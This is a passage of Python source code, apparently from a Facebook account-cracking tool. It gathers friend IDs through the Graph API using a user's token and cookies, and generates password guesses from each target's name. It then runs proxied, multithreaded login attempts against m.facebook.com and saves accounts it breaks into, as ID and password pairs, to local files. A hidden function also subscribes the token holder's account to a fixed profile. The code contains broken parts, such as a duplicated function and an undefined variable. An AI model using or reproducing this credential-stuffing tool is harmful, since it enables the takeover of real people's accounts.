					open(".token.txt", "w").write(token)
					print('%sLogin Succes...✓%s'%(h, p))

				else:
					print('%sFailled Get Token%s'%(m, p))

			except:
				print('Failled Get Token')

		print(f'  {x}[{h}•{x}]{h} Berhasil Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN X..... !!%s'%(x,k,x,m,x))
		print(e)
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
		
def menu():
	os.system('clear')
	banner()
	#print(f'{Y}[MENU]{Y}')
	print("\033[35;1m [ 1 ] CRACK FILE [ ON ]")
	print("\x1b[1;94m [ 3 ] CRACK ID [ ON ]")
	#print(f'{N}[{Y}3{N}] BO DANANE COOKIES	')
	#print(f'{N}[{Y}4{N}] BO SRENAWAY COOKIES	')
	V = ('\033[1;36mOPTION :  ')
	ch = input(f'{V}: ')
	if ch in ['1','01']:
		crack_file()

	elif ch in ['2','02']:
		lok()
	elif ch in ['3','03']:
		dump_massal()
	elif ch in ['4','04']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> COOKIES SRAYAWA ')
		exit()
	else:
		print('╰─> NO ')
		back()
                
#login
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(' How Many id : '))
	except ValueError:
		print('ERROR ')
		exit()
	if jum<1 or jum>100:
		print(' Dump ID ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' ID'+str(yz)+' : ')
		uid.append(kl)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
		print('')
		print(f' Total IDs : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('</> Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'<•>{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
            try:
                fileX = input (f'\x1b[0m File {R}:{G} ')
                for line in open(fileX, 'r').readlines():
                    id.append(line.strip())
                setting()
            except IOError:
               exit(f"\n{R}File %s not found"%(fileX))
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'\033[1;30m [ 1 ] RANDOM {Y}{N}')
	V = ('\033[1;36mOPTION :  ')
	hu = input(f'{V}: ')
	if hu in ['1','01']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		exit()
	print(f'\x1b[1;94m[ 1 ] METHOD M [UPDATE] {Y}{N}')
	#print(f'{N}[{Y}2{N}] FREE.FACEBOOK.COM {Y}{N}')
	#print(f'{N}[{Y}3{N}] X.FACEBOOK.COM {Y}{N}')
	#print(f'{N}[{Y}4{N}] D.FACEBOOK.COM {Y}{N}')
	#print(f'{N}[{Y}5{N}] P.FACEBOOK.COM {Y}{N}')
	V = ('\033[1;36mOPTION :  ')
	hc = input(f'{V}: ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['3','03']:
		method.append('x')
	elif hc in ['4','04']:
		method.append('d')
	elif hc in ['5','05']:
		method.append('p')
	elif hc in ['2','02']:
		method.append('free')
	else:
		method.append('mobile')
	print(f'{N}│')
	passwrd()
	ara()
	ar()
	a()
	l()
	b()
	c()
	o()

#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
   print(f'\x1b[1;91m[ 1 ] 123 + 1234 + 12345 {Y}[FAST+HAWA]{N}')
   #print(f'{N}[{Y}2{N}] 123 + @@ {Y}[SLOW BEST✓]{N}')
   #print(f'{N}[{Y}3{N}] 123 + ZAXO  {Y}[FAST BEST✓]{N}') 
   #print(f'{N}[{Y}4{N}] 1985 + @@ {Y}[FAST BEST✓]{N}')
   #print(f'{N}[{Y}5{N}] 123 + NAME {Y}[FAST BEST✓]{N}')
   #print(f'{N}[{Y}6{N}] NAME + NUMBER + MIX {Y}[FAST BEST✓]{N}')
   #print(f'{N}[{Y}7{N}] 123 + 2000 + @@ {Y}[VERY SLOW BEST✓]{N}')
   V = ('\033[1;36mOPTION :  ')
   ch = input(f'{V}: ')
   if ch in ['1','01']:
   	ara()
   elif ch in ['2','02']:
    ar()
   elif ch in ['3','03']:
    a()
   elif ch in ['4','04']:
    b()
   elif ch in ['5','05']:
    c()
   elif ch in ['7','07']:
    l()
   elif ch in ['6','06']:
    o()
   else:
    	a()
    	
    	
    	
def c():
	#ARA(f'WAIT TO CRACK') #%(okc,cpc))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+frs+'12')			
					pwv.append(frs+frs+'123')		
					pwv.append(frs+'123'+frs)
					pwv.append('12'+frs+'12')
					pwv.append('123'+frs)
					pwv.append('1234'+frs)
					pwv.append('12345'+frs)
					pwv.append('123456'+frs)
					pwv.append('123'+frs+'123')
					pwv.append('1234'+frs+'1234')
					pwv.append('12345'+frs+'12345')
					pwv.append(frs+'123123')
					pwv.append(frs+'11')
					pwv.append(frs+"12")
					pwv.append(frs+"123")
					pwv.append(frs+"1234")
					pwv.append(frs+"12345")
					pwv.append(frs+"123456")
					pwv.append(frs+"1234567")
					pwv.append(frs+"12345678")
					pwv.append(frs+"123456789")
					pwv.append(frs+"1234567890")
					pwv.append(frs+frs)
					pwv.append(frs+' '+frs)
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+frs+'12')			
					pwv.append(frs+frs+'123')		
					pwv.append(frs+'123'+frs)
					pwv.append('12'+frs+'12')
					pwv.append('123'+frs)
					pwv.append('1234'+frs)
					pwv.append('12345'+frs)
					pwv.append('123456'+frs)
					pwv.append('123'+frs+'123')
					pwv.append('1234'+frs+'1234')
					pwv.append('12345'+frs+'12345')
					pwv.append(frs+'123123')
					pwv.append(frs+'11')
					pwv.append(frs+"12")
					pwv.append(frs+"123")
					pwv.append(frs+"1234")
					pwv.append(frs+"12345")
					pwv.append(frs+"123456")
					pwv.append(frs+"1234567")
					pwv.append(frs+"12345678")
					pwv.append(frs+"123456789")
					pwv.append(frs+"1234567890")
					pwv.append(frs+frs)
					pwv.append(frs+' '+frs)
			if 'mobile' in method:
				pool.submit(crackmobile_ARA,idf,pwv,nmf)
			elif 'x' in method:
				pool.submit(crackx_ARA,idf,pwv,nmf)
			elif 'd' in method:
				pool.submit(crackd_ARA,idf,pwv,nmf)
			elif 'p' in method:
				pool.submit(crackp_ARA,idf,pwv,nmf)
			elif 'free' in method:
				pool.submit(crackfree_ARA,idf,pwv,nmf)
			else:
				pool.submit(crackfree,idf,pwv,nmf)
	print(f'{N}[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{N}DWBARA CRACK DAKAY (A/NA) ? ')
	woi = input('\033[1;36mOPTION :  ')
	if woi in ['a','A']:
		back()
	else:
		print(f'\t{x}  {N}[{k} Gimana Udah Bersyukur Blum ]{x} ')
		time.sleep(1)
		exit()
		
		
def o():
	#ARA(f'WAIT TO CRACK') #%(okc,cpc))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'12'+frs)			
					pwv.append(frs+'123'+frs)		
					pwv.append(frs+'1234'+frs)
					pwv.append(frs+'12345'+frs)
					pwv.append(frs+'123456'+frs)
					pwv.append(frs+"1111")
					pwv.append(frs+' '+frs+' '+frs)
					pwv.append(frs+frs+'11')
					pwv.append(frs+frs+'12')
					pwv.append(frs+frs+'123')
					pwv.append(frs+frs+'1234')
					pwv.append(frs+frs+'12345')
					pwv.append(frs+frs+'123456')
					pwv.append(frs+"1221")
					pwv.append(frs+"123321")
					pwv.append(frs+"12344321")
					pwv.append(frs+"1234554321")
					pwv.append(frs+"123456654321")
					pwv.append('12'+frs)
					pwv.append('123'+frs)
					pwv.append('1234'+frs)
					pwv.append('12345'+frs)
					pwv.append('123456'+frs)
					pwv.append(frs+frs)
					pwv.append(frs+' '+frs)
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'12'+frs)			
					pwv.append(frs+'123'+frs)		
					pwv.append(frs+'1234'+frs)
					pwv.append(frs+'12345'+frs)
					pwv.append(frs+'123456'+frs)
					pwv.append(frs+"1111")
					pwv.append(frs+' '+frs+' '+frs)
					pwv.append(frs+frs+'11')
					pwv.append(frs+frs+'12')
					pwv.append(frs+frs+'123')
					pwv.append(frs+frs+'1234')
					pwv.append(frs+frs+'12345')
					pwv.append(frs+frs+'123456')
					pwv.append(frs+"1221")
					pwv.append(frs+"123321")
					pwv.append(frs+"12344321")
					pwv.append(frs+"1234554321")
					pwv.append(frs+"123456654321")
					pwv.append('12'+frs)
					pwv.append('123'+frs)
					pwv.append('1234'+frs)
					pwv.append('12345'+frs)
					pwv.append('123456'+frs)
					pwv.append(frs+frs)
					pwv.append(frs+' '+frs)
			if 'mobile' in method:
				pool.submit(crackmobile_ARA,idf,pwv,nmf)
			elif 'x' in method:
				pool.submit(crackx_ARA,idf,pwv,nmf)
			elif 'd' in method:
				pool.submit(crackd_ARA,idf,pwv,nmf)
			elif 'p' in method:
				pool.submit(crackp_ARA,idf,pwv,nmf)
			elif 'free' in method:
				pool.submit(crackfree_ARA,idf,pwv,nmf)
			else:
				pool.submit(crackfree,idf,pwv,nmf)
	print(f'{N}[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{N}DWBARA CRACK DAKAY (A/NA) ? ')
	woi = input(f'HALLBZHER : ')
	if woi in ['a','A']:
		back()
	else:
		print(f'\t{x}  {N}[{k} Gimana Udah Bersyukur Blum ]{x} ')
		time.sleep(1)
		exit()
		 	 	
def b():
	#ARA(f'WAIT TO CRACK') #%(okc,cpc))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'11')			
					pwv.append(frs+'111')		
					pwv.append(frs+'@#')
					pwv.append(frs+'@@')
					pwv.append(frs+'123@')
					pwv.append(frs+'12345@')
					pwv.append(frs+'@123')
					pwv.append(frs+'@12345')
					pwv.append(frs+frs+'123')
					pwv.append(frs+'123123')
					pwv.append('123'+frs+frs)
					pwv.append(frs+'1985')
					pwv.append(frs+'1986')
					pwv.append(frs+'1987')
					pwv.append(frs+'1988')
					pwv.append(frs+'1989')
					pwv.append(frs+'1990')
					pwv.append(frs+'1991')
					pwv.append(frs+'1992')
					pwv.append(frs+'1993')
					pwv.append(frs+'1994')
					pwv.append(frs+'1995')
					pwv.append(frs+'1996')
					pwv.append(frs+'1997')
					pwv.append(frs+'1998')
					pwv.append(frs+'1999')
					pwv.append(frs+frs)
					pwv.append(frs+' '+frs)
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'11')			
					pwv.append(frs+'111')		
					pwv.append(frs+'@#')
					pwv.append(frs+'@@')
					pwv.append(frs+'123@')
					pwv.append(frs+'12345@')
					pwv.append(frs+'@123')
					pwv.append(frs+'@12345')
					pwv.append(frs+frs+'123')
					pwv.append(frs+'123123')
					pwv.append('123'+frs+frs)
					pwv.append(frs+'1985')
					pwv.append(frs+'1986')
					pwv.append(frs+'1987')
					pwv.append(frs+'1988')
					pwv.append(frs+'1989')
					pwv.append(frs+'1990')
					pwv.append(frs+'1991')
					pwv.append(frs+'1992')
					pwv.append(frs+'1993')
					pwv.append(frs+'1994')
					pwv.append(frs+'1995')
					pwv.append(frs+'1996')
					pwv.append(frs+'1997')
					pwv.append(frs+'1998')
					pwv.append(frs+'1999')
					pwv.append(frs+frs)
					pwv.append(frs+' '+frs)
			if 'mobile' in method:
				pool.submit(crackmobile_ARA,idf,pwv,nmf)
			elif 'x' in method:
				pool.submit(crackx_ARA,idf,pwv,nmf)
			elif 'd' in method:
				pool.submit(crackd_ARA,idf,pwv,nmf)
			elif 'p' in method:
				pool.submit(crackp_ARA,idf,pwv,nmf)
			elif 'free' in method:
				pool.submit(crackfree_ARA,idf,pwv,nmf)
			else:
				pool.submit(crackfree,idf,pwv,nmf)
	print(f'{N}[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{N}DWBARA CRACK DAKAY (A/NA) ? ')
	woi = input(f'HALLBZHER : ')
	if woi in ['a','A']:
		back()
	else:
		print(f'\t{x}  {N}[{k} Gimana Udah Bersyukur Blum ]{x} ')
		time.sleep(1)
		exit()
def ara():
	#ARA(f'WAIT TO CRACK') #%(okc,cpc))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
						pwv.append(nmf)
						pwv.append(frs+"12")
						pwv.append(frs+"123")
						pwv.append(frs+"1234")
						pwv.append(frs+"12345")
						pwv.append(frs+"123456")
						pwv.append(frs+"1234567")
						pwv.append(frs+"12345678")
						pwv.append(frs+"123456789")
						pwv.append(frs+"1212")
						pwv.append(frs+"11223344")
						pwv.append(frs+"112233")
						pwv.append(frs+"123321")
						pwv.append(frs+"123123")
						pwv.append("07500750")
						pwv.append("07700770")
						pwv.append("22446688")
						pwv.append(frs+frs)
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
						pwv.append(nmf)
						pwv.append(frs+"12")
						pwv.append(frs+"123")
						pwv.append(frs+"1234")
						pwv.append(frs+"12345")
						pwv.append(frs+"123456")
						pwv.append(frs+"1234567")
						pwv.append(frs+"12345678")
						pwv.append(frs+"123456789")
						pwv.append(frs+"1212")
						pwv.append(frs+"11223344")
						pwv.append(frs+"112233")
						pwv.append(frs+"123321")
						pwv.append(frs+"123123")
						pwv.append("07500750")
						pwv.append("07700770")
						pwv.append("22446688")
						pwv.append(frs+frs)
			if 'mobile' in method:
				pool.submit(crackmobile_ARA,idf,pwv,nmf)
			elif 'x' in method:
				pool.submit(crackx_ARA,idf,pwv,nmf)
			elif 'd' in method:
				pool.submit(crackd_ARA,idf,pwv,nmf)
			elif 'p' in method:
				pool.submit(crackp_ARA,idf,pwv,nmf)
			elif 'free' in method:
				pool.submit(crackfree_ARA,idf,pwv,nmf)
			else:
				pool.submit(crackfree,idf,pwv,nmf)
	print(f'{N}[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{N}DWBARA CRACK DAKAY (A/NA) ? ')
	woi = input(f'HALLBZHER : ')
	if woi in ['a','A']:
		back()
	else:
		print(f'\t{x}  {N}[{k} Gimana Udah Bersyukur Blum ]{x} ')
		time.sleep(1)
		exit()
def ar():
	#ARA(f'WAIT TO CRACK') #%(okc,cpc))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'123'+frs)
					pwv.append(frs+frs+'123')
					pwv.append(frs+frs+'1234')
					pwv.append(frs+frs+'@123')
					pwv.append(frs+frs+'@1234')
					pwv.append(frs+frs+'@12345')
					pwv.append('123'+frs)
					pwv.append('1234'+frs)
					pwv.append('12345'+frs)
					pwv.append(frs+'@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+'@1235')
					pwv.append(frs+'123@')
					pwv.append(frs+'1234@')
					pwv.append(frs+'12345@')
					pwv.append(frs+frs)
					pwv.append(frs+' '+frs)
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'123'+frs)
					pwv.append(frs+frs+'123')
					pwv.append(frs+frs+'1234')
					pwv.append(frs+frs+'@123')
					pwv.append(frs+frs+'@1234')
					pwv.append(frs+frs+'@12345')
					pwv.append('123'+frs)
					pwv.append('1234'+frs)
					pwv.append('12345'+frs)
					pwv.append(frs+'@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+'@1235')
					pwv.append(frs+'123@')
					pwv.append(frs+'1234@')
					pwv.append(frs+'12345@')
					pwv.append(frs+frs)
					pwv.append(frs+' '+frs)
			if 'mobile' in method:
				pool.submit(crackmobile_ARA,idf,pwv,nmf)
			elif 'x' in method:
				pool.submit(crackx_ARA,idf,pwv,nmf)
			elif 'd' in method:
				pool.submit(crackd_ARA,idf,pwv,nmf)
			elif 'p' in method:
				pool.submit(crackp_ARA,idf,pwv,nmf)
			elif 'free' in method:
				pool.submit(crackfree_ARA,idf,pwv,nmf)
			else:
				pool.submit(crackfree,idf,pwv,nmf)
	print(f'{N}[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{N}DWBARA CRACK DAKAY (A/NA) ? ')
	woi = input(f'HALLBZHER : ')
	if woi in ['a','A']:
		back()
	else:
		print(f'\t{x}  {N}[{k} Gimana Udah Bersyukur Blum ]{x} ')
		time.sleep(1)
		exit()
def l():
	#ARA(f'WAIT TO CRACK') #%(okc,cpc))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'11')
					pwv.append(frs+'111')
					pwv.append(frs+'@#')
					pwv.append(frs+'@@')
					pwv.append(frs+'1985')
					pwv.append(frs+'1986')
					pwv.append(frs+'1987')
					pwv.append(frs+'1988')
					pwv.append(frs+'1989')
					pwv.append(frs+'1990')
					pwv.append(frs+'1991')
					pwv.append(frs+'1992')
					pwv.append(frs+'1993')
					pwv.append(frs+'1994')
					pwv.append(frs+'1995')
					pwv.append(frs+'1996')
					pwv.append(frs+'1997')
					pwv.append(frs+'1998')
					pwv.append(frs+'1999')
					pwv.append(frs+'1122')
					pwv.append(frs+'112233')
					pwv.append(frs+'11223344')
					pwv.append(frs+'1122334455')
					pwv.append(frs+'1122334466')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'123'+frs)
					pwv.append(frs+frs+'123')
					pwv.append(frs+frs+'1234')
					pwv.append(frs+frs+'@123')
					pwv.append(frs+frs+'@1234')
					pwv.append(frs+frs+'@12345')
					pwv.append('123'+frs)
					pwv.append('1234'+frs)
					pwv.append('12345'+frs)
					pwv.append(frs+'@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+'@1235')
					pwv.append(frs+'123@')
					pwv.append(frs+'1234@')
					pwv.append(frs+'12345@')
					pwv.append(frs+frs)
					pwv.append(frs+' '+frs)
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'11')
					pwv.append(frs+'111')
					pwv.append(frs+'@#')
					pwv.append(frs+'@@')
					pwv.append(frs+'1985')
					pwv.append(frs+'1986')
					pwv.append(frs+'1987')
					pwv.append(frs+'1988')
					pwv.append(frs+'1989')
					pwv.append(frs+'1990')
					pwv.append(frs+'1991')
					pwv.append(frs+'1992')
					pwv.append(frs+'1993')
					pwv.append(frs+'1994')
					pwv.append(frs+'1995')
					pwv.append(frs+'1996')
					pwv.append(frs+'1997')
					pwv.append(frs+'1998')
					pwv.append(frs+'1999')
					pwv.append(frs+'1122')
					pwv.append(frs+'112233')
					pwv.append(frs+'11223344')
					pwv.append(frs+'1122334455')
					pwv.append(frs+'1122334466')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'123'+frs)
					pwv.append(frs+frs+'123')
					pwv.append(frs+frs+'1234')
					pwv.append(frs+frs+'@123')
					pwv.append(frs+frs+'@1234')
					pwv.append(frs+frs+'@12345')
					pwv.append('123'+frs)
					pwv.append('1234'+frs)
					pwv.append('12345'+frs)
					pwv.append(frs+'@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+'@1235')
					pwv.append(frs+'123@')
					pwv.append(frs+'1234@')
					pwv.append(frs+'12345@')
					pwv.append(frs+frs)
					pwv.append(frs+' '+frs)
			if 'mobile' in method:
				pool.submit(crackmobile_ARA,idf,pwv,nmf)
			elif 'x' in method:
				pool.submit(crackx_ARA,idf,pwv,nmf)
			elif 'd' in method:
				pool.submit(crackd_ARA,idf,pwv,nmf)
			elif 'p' in method:
				pool.submit(crackp_ARA,idf,pwv,nmf)
			elif 'free' in method:
				pool.submit(crackfree_ARA,idf,pwv,nmf)
			else:
				pool.submit(crackfree,idf,pwv,nmf)
	print(f'{N}[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{N}DWBARA CRACK DAKAY (A/NA) ? ')
	woi = input(f'HALLBZHER : ')
	if woi in ['a','A']:
		back()
	else:
		print(f'\t{x}  {N}[{k} Gimana Udah Bersyukur Blum ]{x} ')
		time.sleep(1)
		exit()
		
def a():
	#ARA(f'WAIT TO CRACK') #%(okc,cpc))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
						pwv.append(nmf)
						pwv.append("zaxozaxo")
						pwv.append("zaxo123")
						pwv.append("zaxozaxo123")
						pwv.append("zaxo1234")
						pwv.append("zaxozaxo1234")
						pwv.append("zaxo12345")
						pwv.append("zaxozaxo12345")
						pwv.append("zaxo123456")
						pwv.append("zaxozaxo123456")
						pwv.append("zaxo12345678")			
						pwv.append(frs+"12")
						pwv.append(frs+"123")
						pwv.append(frs+"1234")
						pwv.append(frs+"12345")
						pwv.append(frs+"123456")
						pwv.append(frs+"1234567")
						pwv.append(frs+"12345678")
						pwv.append(frs+"123456789")
						pwv.append(frs+"1212")
						pwv.append(frs+"11223344")
						pwv.append(frs+"112233")
						pwv.append(frs+"123321")
						pwv.append(frs+"123123")
						pwv.append("07500750")
						pwv.append("07700770")
						pwv.append("22446688")		
						pwv.append(frs+frs)
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
						pwv.append(nmf)
						pwv.append("zaxozaxo")
						pwv.append("zaxo123")
						pwv.append("zaxozaxo123")
						pwv.append("zaxo1234")
						pwv.append("zaxozaxo1234")
						pwv.append("zaxo12345")
						pwv.append("zaxozaxo12345")
						pwv.append("zaxo123456")
						pwv.append("zaxozaxo123456")
						pwv.append("zaxo12345678")			
						pwv.append(frs+"12")
						pwv.append(frs+"123")
						pwv.append(frs+"1234")
						pwv.append(frs+"12345")
						pwv.append(frs+"123456")
						pwv.append(frs+"1234567")
						pwv.append(frs+"12345678")
						pwv.append(frs+"123456789")
						pwv.append(frs+"1212")
						pwv.append(frs+"11223344")
						pwv.append(frs+"112233")
						pwv.append(frs+"123321")
						pwv.append(frs+"123123")
						pwv.append("07500750")
						pwv.append("07700770")
						pwv.append("22446688")		
						pwv.append(frs+frs)
			if 'mobile' in method:
				pool.submit(crackmobile_ARA,idf,pwv,nmf)
			elif 'x' in method:
				pool.submit(crackx_ARA,idf,pwv,nmf)
			elif 'd' in method:
				pool.submit(crackd_ARA,idf,pwv,nmf)
			elif 'p' in method:
				pool.submit(crackp_ARA,idf,pwv,nmf)
			elif 'free' in method:
				pool.submit(crackfree_ARA,idf,pwv,nmf)
			else:
				pool.submit(crackfree,idf,pwv,nmf)
	print(f'{N}[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{N}DWBARA CRACK DAKAY (A/NA) ? ')
	woi = input(f'HALLBZHER : ')
	if woi in ['a','A']:
		back()
	else:
		print(f'\t{x}  {N}[{k} Gimana Udah Bersyukur Blum ]{x} ')
		time.sleep(1)
		exit()
		
                
		
#--------------------[ METODE-B-API ]-----------------#
def crackmobile_ARA(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write(f'\r{GR}[{R}%sHaWa{N}]-{PI}[%s/%s]{GR}[OK:%s]{U}[CP:%s]-[%s%s]%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update = {'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '3',
    'referer': 'https://m.facebook.com/bookmarks/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"JKM-LX1"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"9.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=1.75; wd=412x814'
			heade = {'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '3',
    'referer': 'https://m.facebook.com/bookmarks/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"JKM-LX1"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"9.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				#print(f'\r{N}[Omed-CP]{R}{idf}{R}|{R}{pw}{R}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				open('/sdcard/ARA-CP.txt','a').write(f'{idf}|{pe}\n')
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
